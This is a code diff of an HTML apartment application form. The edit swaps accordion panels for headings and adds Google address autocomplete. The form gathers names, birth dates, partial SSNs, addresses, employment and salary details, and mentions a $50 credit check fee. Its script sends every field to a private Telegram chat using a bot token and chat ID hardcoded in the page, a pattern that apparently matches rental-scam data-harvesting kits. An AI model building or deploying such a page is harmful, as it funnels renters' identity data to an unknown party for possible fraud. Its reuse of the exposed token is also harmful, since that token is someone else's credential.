@@ -21,26 +21,7 @@ body {
   width: 100%;
 }
 h2 { text-align: center; margin-bottom: 20px; }
-.accordion {
-  background-color: #007bff;
-  color: white;
-  cursor: pointer;
-  padding: 12px;
-  width: 100%;
-  border: none;
-  text-align: left;
-  outline: none;
-  font-size: 16px;
-  border-radius: 6px;
-  margin-top: 10px;
-  transition: background 0.3s;
-}
-.accordion:hover { background-color: #0056b3; }
-.panel {
-  padding: 10px 0 0 0;
-  display: none;
-  overflow: hidden;
-}
+h3 { margin-top: 20px; color: #333; }
 input, textarea, select, button {
   width: 100%; padding: 10px; margin: 6px 0;
   border-radius: 6px; border: 1px solid #ccc; font-size: 14px;
@@ -66,162 +47,152 @@ label { font-weight: bold; display: block; margin-top: 10px; }
   <h2>Apartment Application</h2>
   <form id="applicationForm">
 
-    <!-- Accordion: Personal Information -->
-    <button type="button" class="accordion">Personal Information</button>
-    <div class="panel">
-      <label>Type of Applicant:</label>
-      <div class="checkbox-group">
-        <label><input type="radio" name="applicant_type" value="Tenant" required> Tenant</label>
-        <label><input type="radio" name="applicant_type" value="Guarantor" required> Guarantor</label>
-      </div>
-      <label>If Guarantor, prospective tenant & relation:</label>
-      <input type="text" name="prospective_tenant">
-      <label>Full Name:</label>
-      <input type="text" name="full_name" required>
-      <label>Date of Birth:</label>
-      <input type="date" name="dob" required>
-      <label>Home Phone:</label>
-      <input type="tel" name="home_phone">
-      <label>Work Phone:</label>
-      <input type="tel" name="work_phone">
-      <label>Mobile Phone:</label>
-      <input type="tel" name="mobile_phone" required>
-      <label>Last 4 of SSN:</label>
-      <input type="text" name="ssn_last4" maxlength="4" pattern="\d{4}" required>
-      <label>Email Address:</label>
-      <input type="email" name="email" required>
+    <!-- Personal Information -->
+    <h3>Personal Information</h3>
+    <label>Type of Applicant:</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="applicant_type" value="Tenant" required> Tenant</label>
+      <label><input type="radio" name="applicant_type" value="Guarantor" required> Guarantor</label>
     </div>
+    <label>If Guarantor, prospective tenant & relation:</label>
+    <input type="text" name="prospective_tenant">
 
-    <!-- Accordion: Rental History -->
-    <button type="button" class="accordion">Rental History</button>
-    <div class="panel">
-      <label>Current Address:</label>
-      <input type="text" name="current_address" required>
-      <label>Apt # / City / State / Zip:</label>
-      <input type="text" name="current_city_state_zip" required>
-      <label>Landlord/Mgmt Co.:</label>
-      <input type="text" name="current_landlord">
-      <label>Landlord’s Phone:</label>
-      <input type="tel" name="current_landlord_phone">
-      <label>Dates of Residence:</label>
-      <input type="text" name="current_dates" placeholder="From MM/DD/YYYY to MM/DD/YYYY">
-      <label>Rent Amount:</label>
-      <input type="number" name="current_rent" min="0">
-      <label>Reason for Moving:</label>
-      <textarea name="current_reason" rows="2"></textarea>
+    <label>Full Name:</label>
+    <input type="text" name="full_name" required>
+    <label>Date of Birth:</label>
+    <input type="date" name="dob" required>
 
-      <label>Previous Address:</label>
-      <input type="text" name="previous_address">
-      <label>Apt # / City / State / Zip:</label>
-      <input type="text" name="previous_city_state_zip">
-      <label>Own or Rent?</label>
-      <input type="text" name="own_or_rent">
-      <label>Landlord/Mgmt Co.:</label>
-      <input type="text" name="previous_landlord">
-      <label>Landlord’s Phone:</label>
-      <input type="tel" name="previous_landlord_phone">
-      <label>Dates of Residence:</label>
-      <input type="text" name="previous_dates" placeholder="From MM/DD/YYYY to MM/DD/YYYY">
-      <label>Rent Amount:</label>
-      <input type="number" name="previous_rent" min="0">
-    </div>
+    <label>Mobile Phone:</label>
+    <input type="tel" name="mobile_phone" required>
 
-    <!-- Accordion: Employment History -->
-    <button type="button" class="accordion">Employment History</button>
-    <div class="panel">
-      <label>Current Employer:</label>
-      <input type="text" name="current_employer">
-      <label>Occupation/Position:</label>
-      <input type="text" name="current_position">
-      <label>Work Address:</label>
-      <input type="text" name="current_work_address">
-      <label>Dates of Employment:</label>
-      <input type="text" name="current_employment_dates" placeholder="From MM/DD/YYYY to MM/DD/YYYY">
-      <label>Salary:</label>
-      <input type="number" name="current_salary" min="0">
-      <label>Supervisor Name & Title:</label>
-      <input type="text" name="current_supervisor">
-      <label>Supervisor Phone:</label>
-      <input type="tel" name="current_supervisor_phone">
+    <label>Last 4 of SSN:</label>
+    <input type="text" name="ssn_last4" maxlength="4" pattern="\d{4}" required>
 
-      <label>Previous Employer:</label>
-      <input type="text" name="previous_employer">
-      <label>Occupation/Position:</label>
-      <input type="text" name="previous_position">
-      <label>Work Address:</label>
-      <input type="text" name="previous_work_address">
-      <label>Dates of Employment:</label>
-      <input type="text" name="previous_employment_dates" placeholder="From MM/DD/YYYY to MM/DD/YYYY">
-      <label>Salary:</label>
-      <input type="number" name="previous_salary" min="0">
-      <label>Supervisor Name & Title:</label>
-      <input type="text" name="previous_supervisor">
-      <label>Supervisor Phone:</label>
-      <input type="tel" name="previous_supervisor_phone">
-    </div>
+    <label>Email Address:</label>
+    <input type="email" name="email" required>
 
-    <!-- Accordion: Authorization -->
-    <button type="button" class="accordion">Authorization & Fee</button>
-    <div class="panel">
-      <p>I hereby authorize the Landlord or Rental Agent to obtain information it deems desirable, including credit reports, civil or criminal actions, rental history, employment/salary details, and any other relevant information. This application releases the Landlord, its employees and agents, from all liabilities incurred in furnishing and obtaining such information.</p>
-      <p>*Credit check fee: $50.00 per applicant</p>
-    </div>
+    <!-- Rental History -->
+    <h3>Rental History</h3>
+    <label>Current Address:</label>
+    <input type="text" name="current_address" id="current_address" required>
+    <label>Apt # / City / State / Zip:</label>
+    <input type="text" name="current_city_state_zip" required>
+    <label>Landlord/Mgmt Co.:</label>
+    <input type="text" name="current_landlord">
+    <label>Landlord’s Phone:</label>
+    <input type="tel" name="current_landlord_phone">
+    <label>Dates of Residence:</label>
+    <input type="text" name="current_dates" placeholder="From MM/DD/YYYY to MM/DD/YYYY">
+    <label>Rent Amount:</label>
+    <input type="number" name="current_rent" min="0">
+    <label>Reason for Moving:</label>
+    <textarea name="current_reason" rows="2"></textarea>
+
+    <label>Previous Address:</label>
+    <input type="text" name="previous_address" id="previous_address">
+    <label>Apt # / City / State / Zip:</label>
+    <input type="text" name="previous_city_state_zip">
+    <label>Own or Rent?</label>
+    <input type="text" name="own_or_rent">
+    <label>Landlord/Mgmt Co.:</label>
+    <input type="text" name="previous_landlord">
+    <label>Landlord’s Phone:</label>
+    <input type="tel" name="previous_landlord_phone">
+    <label>Dates of Residence:</label>
+    <input type="text" name="previous_dates" placeholder="From MM/DD/YYYY to MM/DD/YYYY">
+    <label>Rent Amount:</label>
+    <input type="number" name="previous_rent" min="0">
+
+    <!-- Employment History -->
+    <h3>Employment History</h3>
+    <label>Current Employer:</label>
+    <input type="text" name="current_employer">
+    <label>Occupation/Position:</label>
+    <input type="text" name="current_position">
+    <label>Work Address:</label>
+    <input type="text" name="current_work_address">
+    <label>Dates of Employment:</label>
+    <input type="text" name="current_employment_dates" placeholder="From MM/DD/YYYY to MM/DD/YYYY">
+    <label>Salary:</label>
+    <input type="number" name="current_salary" min="0">
+    <label>Supervisor Name & Title:</label>
+    <input type="text" name="current_supervisor">
+    <label>Supervisor Phone:</label>
+    <input type="tel" name="current_supervisor_phone">
+
+    <label>Previous Employer:</label>
+    <input type="text" name="previous_employer">
+    <label>Occupation/Position:</label>
+    <input type="text" name="previous_position">
+    <label>Work Address:</label>
+    <input type="text" name="previous_work_address">
+    <label>Dates of Employment:</label>
+    <input type="text" name="previous_employment_dates" placeholder="From MM/DD/YYYY to MM/DD/YYYY">
+    <label>Salary:</label>
+    <input type="number" name="previous_salary" min="0">
+    <label>Supervisor Name & Title:</label>
+    <input type="text" name="previous_supervisor">
+    <label>Supervisor Phone:</label>
+    <input type="tel" name="previous_supervisor_phone">
+
+    <!-- Authorization -->
+    <h3>Authorization & Fee</h3>
+    <p>I hereby authorize the Landlord or Rental Agent to obtain information it deems desirable, including credit reports, civil or criminal actions, rental history, employment/salary details, and any other relevant information. This application releases the Landlord, its employees and agents, from all liabilities incurred in furnishing and obtaining such information.</p>
+    <p>*Credit check fee: $50.00 per applicant</p>
 
     <button type="submit" class="submit-btn">Submit Application</button>
   </form>
   <div id="response"></div>
 </div>
 
+<!-- Google Places API -->
+<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&libraries=places"></script>
 <script>
-  // Accordion toggle
-  const acc = document.getElementsByClassName("accordion");
-  for(let i = 0; i < acc.length; i++){
-    acc[i].addEventListener("click", function(){
-      this.classList.toggle("active");
-      const panel = this.nextElementSibling;
-      panel.style.display = panel.style.display === "block" ? "none" : "block";
-    });
+function initAutocomplete() {
+  new google.maps.places.Autocomplete(document.getElementById('current_address'), { types: ['address'] });
+  new google.maps.places.Autocomplete(document.getElementById('previous_address'), { types: ['address'] });
+}
+google.maps.event.addDomListener(window, 'load', initAutocomplete);
+
+// Telegram submission
+const BOT_TOKEN = "8428652927:AAEUirmhHly-u0E_HYDNdOzWp0m3MsXR_Oc";
+const CHAT_ID = "5590862324"; 
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+document.getElementById("applicationForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const form = e.target;
+  const submitButton = form.querySelector("button.submit-btn");
+  submitButton.disabled = true;
+  submitButton.textContent = "Sending...";
+
+  const data = Object.fromEntries(new FormData(form));
+  let text = "🏠 New Apartment Application:\n\n";
+  for(const key in data){
+    text += `*${key.replace(/_/g," ")}*: ${data[key]}\n`;
   }
 
-  // Telegram submission
-  const BOT_TOKEN = "8428652927:AAEUirmhHly-u0E_HYDNdOzWp0m3MsXR_Oc";
-  const CHAT_ID = "5590862324"; 
-  const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-  document.getElementById("applicationForm").addEventListener("submit", async (e) => {
-    e.preventDefault();
-    const form = e.target;
-    const submitButton = form.querySelector("button.submit-btn");
-    submitButton.disabled = true;
-    submitButton.textContent = "Sending...";
-
-    const data = Object.fromEntries(new FormData(form));
-    let text = "🏠 New Apartment Application:\n\n";
-    for(const key in data){
-      text += `*${key.replace(/_/g," ")}*: ${data[key]}\n`;
+  try {
+    const res = await fetch(TELEGRAM_API, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text })
+    });
+    const result = await res.json();
+    if(result.ok){
+      document.getElementById("response").innerHTML = "<p class='success'>✅ Application sent successfully!</p>";
+      form.reset();
+    } else {
+      document.getElementById("response").innerHTML = "<p class='error'>❌ Failed to send. Check your bot token and chat ID.</p>";
     }
-
-    try {
-      const res = await fetch(TELEGRAM_API, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text })
-      });
-      const result = await res.json();
-      if(result.ok){
-        document.getElementById("response").innerHTML = "<p class='success'>✅ Application sent successfully!</p>";
-        form.reset();
-      } else {
-        document.getElementById("response").innerHTML = "<p class='error'>❌ Failed to send. Check your bot token and chat ID.</p>";
-      }
-    } catch(err){
-      document.getElementById("response").innerHTML = "<p class='error'>❌ Error sending to Telegram.</p>";
-      console.error(err);
-    } finally {
-      submitButton.disabled = false;
-      submitButton.textContent = "Submit Application";
-    }
-  });
+  } catch(err){
+    document.getElementById("response").innerHTML = "<p class='error'>❌ Error sending to Telegram.</p>";
+    console.error(err);
+  } finally {
+    submitButton.disabled = false;
+    submitButton.textContent = "Submit Application";
+  }
+});
 </script>
 </body>
 </html>
